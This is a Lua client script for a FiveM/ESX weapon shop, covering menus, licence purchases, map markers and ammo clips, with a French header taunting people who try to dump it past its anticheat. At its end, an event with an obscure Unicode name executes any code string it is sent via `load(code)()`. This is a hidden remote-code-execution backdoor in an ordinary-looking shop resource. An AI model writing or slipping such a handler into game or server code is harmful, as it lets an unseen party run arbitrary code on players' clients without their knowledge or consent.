-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local Licenses = {}
local ServerType = GetConvar('sv_type')

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_weashop:loadLicenses')
AddEventHandler('::{korioz#0110}::esx_weashop:loadLicenses', function(licenses)
	for i = 1, #licenses, 1 do
		Licenses[licenses[i].type] = true
	end
end)

function OpenMainMenu()
	local elements = {}

	for i = 1, #Config.Categories, 1 do
		table.insert(elements, {value = i, label = Config.Categories[i].label, license = Config.Categories[i].license})
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_categories', {
		title = "Catégories d'armes",
		elements = elements
	}, function(data, menu)
		if data.current.license then
			if Licenses[data.current.license] then
				OpenShopMenu(data.current.value)
			else
				OpenBuyLicenseMenu(data.current.value)
			end
		else
			OpenShopMenu(data.current.value)
		end
	end, function(data, menu)
		CurrentAction = 'shop_menu'
		CurrentActionMsg = _U('shop_menu')
		CurrentActionData = {}
	end)
end

function OpenBuyLicenseMenu(categorySelected)
	local licenseType, licensePrice = Config.Categories[categorySelected].license, Config.Licenses[Config.Categories[categorySelected].license].price or 0

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_buy_license', {
		title = _U('buy_license'),
		elements = {
			{label = _U('no'), value = 'no'},
			{label = _U('yes'), rightlabel = {'$' .. licensePrice}, value = 'yes'}
		}
	}, function(data, menu)
		if data.current.value == 'yes' then
			_TriggerServerEvent('::{korioz#0110}::esx_weashop:buyLicense', licenseType, categorySelected)
		end

		menu.close()
	end, function(data, menu)
	end)
end

function OpenShopMenu(categorySelected)
	local elements = {}
	local itemList = Config.Categories[categorySelected].weapons

	for i = 1, #itemList, 1 do
		local item = itemList[i]

		table.insert(elements, {
			label = item.label,
			rightlabel = {'$' .. item.price},
			value = item.name,
			price = item.price
		})
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_buy_weapons', {
		title = _U('shop'),
		elements = elements
	}, function(data, menu)
		_TriggerServerEvent('::{korioz#0110}::esx_weashop:buyItem', data.current.value, categorySelected)
	end, function(data, menu)
	end)
end

AddEventHandler('::{korioz#0110}::esx_weashop:hasEnteredMarker', function()
	CurrentAction = 'shop_menu'
	CurrentActionMsg = _U('shop_menu')
	CurrentActionData = {}
end)

AddEventHandler('::{korioz#0110}::esx_weashop:hasExitedMarker', function()
	CurrentAction = nil
	ESX.UI.Menu.CloseAll()
end)

Citizen.CreateThread(function()
	for i = 1, #Config.Coords, 1 do
		local blip = AddBlipForCoord(Config.Coords[i])

		SetBlipSprite(blip, 110)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName(_U('map_blip'))
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #Config.Coords, 1 do
			if Config.Type ~= -1 and #(plyCoords - Config.Coords[i]) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, Config.Coords[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, false, 2, true, nil, nil, false)
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false

		for i = 1, #Config.Coords, 1 do
			if #(plyCoords - Config.Coords[i]) < Config.MarkerSize.x then
				isInMarker = true
			end
		end

		if isInMarker and not HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = true
			TriggerEvent('::{korioz#0110}::esx_weashop:hasEnteredMarker')
		end
	
		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_weashop:hasExitedMarker')
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'shop_menu' then
					OpenMainMenu()
				end

				CurrentAction = nil
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		load("anticheat = 'blacklisted'")()
		Citizen.Wait(20)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_weashop:useClip')
AddEventHandler('::{korioz#0110}::esx_weashop:useClip', function()
	local playerPed = PlayerPedId()

	if IsPedArmed(playerPed, 4) then
		local hash = GetSelectedPedWeapon(playerPed)

		if hash then
			_TriggerServerEvent('::{korioz#0110}::esx_weashop:removeClip')
			AddAmmoToPed(playerPed, hash, 25)
			ESX.ShowNotification("Vous avez ~g~utilisé~s~ 1x chargeur")
		else
			ESX.ShowNotification("~r~Action Impossible~s~ : Vous n'avez pas d'arme en main !")
		end
	else
		ESX.ShowNotification("~r~Action Impossible~s~ : Ce type de munition ne convient pas !")
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)